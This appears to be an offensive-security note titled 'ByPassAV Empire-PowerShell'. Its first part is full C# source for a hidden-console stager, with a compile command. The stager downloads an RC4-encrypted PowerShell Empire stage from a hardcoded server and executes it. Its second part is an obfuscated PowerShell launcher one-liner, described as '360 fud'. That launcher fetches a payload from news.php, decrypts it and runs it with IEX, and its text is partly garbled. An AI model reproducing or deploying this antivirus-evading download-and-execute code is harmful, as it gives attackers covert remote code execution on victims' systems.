## ByPassAV Empire-PowerShell part 1


```markdown
using System;
using System.Collections.Generic;
using System.Linq;
using System.Management.Automation;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
 
namespace PSEmpire_Stage1
{
    class Program
    {
        // RC4 Class to decrypt the stage 2 data
        // Created by Jeong ChangWook. Source https://gist.github.com/hoiogi/89cf2e9aa99ffc3640a4
        public class RC4
        {
            public static byte[] Encrypt(byte[] pwd, byte[] data)
            {
                int a, i, j, k, tmp;
                int[] key, box;
                byte[] cipher;
 
                key = new int[256];
                box = new int[256];
                cipher = new byte[data.Length];
 
                for (i = 0; i < 256; i++)
                {
                    key[i] = pwd[i % pwd.Length];
                    box[i] = i;
                }
                for (j = i = 0; i < 256; i++)
                {
                    j = (j + box[i] + key[i]) % 256;
                    tmp = box[i];
                    box[i] = box[j];
                    box[j] = tmp;
                }
                for (a = j = i = 0; i < data.Length; i++)
                {
                    a++;
                    a %= 256;
                    j += box[a];
                    j %= 256;
                    tmp = box[a];
                    box[a] = box[j];
                    box[j] = tmp;
                    k = box[((box[a] + box[j]) % 256)];
                    cipher[i] = (byte)(data[i] ^ k);
                }
                return cipher;
            }
 
            public static byte[] Decrypt(byte[] pwd, byte[] data)
            {
                return Encrypt(pwd, data);
            }
 
        }
 
        // Hide Windows function by our friends from StackOverFlow
        // https://stackoverflow.com/questions/34440916/hide-the-console-window-from-a-console-application
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
 
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 
        static void Main(string[] args)
        {
            // To Hide the ConsoleWindow (It may be a better way...)
            var handle = GetConsoleWindow();
            ShowWindow(handle, 0);
 
            // Avoid sending Expect 100 Header 
            System.Net.ServicePointManager.Expect100Continue = false;
 
            // Create a WebClient Object (No Proxy Support Included)
            WebClient wc = new WebClient();
            string ua = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";
            wc.Headers["User-Agent"] = ua;
            wc.Headers["Cookie"] = "session=968PH6bE9CDkwYGfsUPraz0x5PQ=";
 
            // Set the Server Address and URL 
            string server = "http://192.168.6.119:8081";
            string target = "/CWoNaJLBo/VTNeWw11212/";
 
            // Download The Data or Stage 2
            byte[] data = wc.DownloadData(server + target);
 
            // Extract IV
            byte[] iv = data.Take(4).Select(i => i).ToArray();
 
            // Remove the IV from the data
            byte[] data_noIV = data.Skip(4).ToArray();
 
            // Set Key value for decryption. PowerEmpire StageingKey value 
            string key = "fdcece0a22c10f83dccc8f17c95a33d4";
            byte[] K = Encoding.ASCII.GetBytes(key);
 
            // Combine the IV + Key (New random key each time)
            byte[] IVK = new byte[iv.Length + K.Length];
            iv.CopyTo(IVK, 0);
            K.CopyTo(IVK, iv.Length);
 
            // Decrypt the Message
            byte[] decrypted = RC4.Decrypt(IVK, data_noIV);
 
            // Convert the stage2 decrypted message from bytes to ASCII
            string stage2 = System.Text.Encoding.ASCII.GetString(decrypted);
 
            // Create a PowerShell Object to execute the command 
            PowerShell PowerShellInstance = PowerShell.Create();
 
            // Create the variables $ser and $u which are part of the downloaded stage2
            PowerShellInstance.Runspace.SessionStateProxy.SetVariable("ser", server);
            PowerShellInstance.Runspace.SessionStateProxy.SetVariable("u", ua);
 
            // Add the Script Stage 2 to the Powershell Object
            PowerShellInstance.AddScript(stage2);
 
            // Execute the Script!
            PowerShellInstance.Invoke();
 
        }
    }
}
```

compile:

`csc.exe PSEmpireStage1.cs /reference:C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\System.Management.Automation.dll`


For more details see [video](https://www.youtube.com/watch?v=0jaC8156BEE)

## ByPassAV Empire-PowerShell part 2

[360 fud](https://blog.flanker017.me/testing-empire-as-post-exploitation-framework-in-domain-environment)

```markdown

"[SYsTem.NET.SErvIcePOInTMANAgER]::EXPecT100CONtiNuE=0;$WC=NEW-OBjECT SYstem.NeT.WEBCliENt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0)
like Gecko';$WC.HeAdErS.Add('User-Agent',$u);$WC.PRoxY= [SYStem.NEt.WEbREqUEsT]::DEfaulTWEBPrOxY;$WC.ProxY.CreDEnTials = [SySTEm.NET.CreDenTIalCache]::DeFAUltNETWOrkCReDentIALs;$Script:Proxy = $wc.Proxy;$K= [SYStEm.TeXT.ENCodiNG]::ASCII.GEtBytES('JV+~fgh!GFWZ8=eiEN{[#}&x_XLtHKT7');$R= {$D,$K=$ArgS;$S=0..255;0..255|%{$J=($J-(-$S[$_])- (-$K[$_%$K.CoUnt]))%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H= ($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_- bXoR$S[($S[$I]+$S[$H])%256]}};$ser='http://172.16.3.77:80';$t='/news.php';$Wc.HEaDERs.AD joIN[ChAr[]](& $R $datA ($IV+$K))|IEX"

```
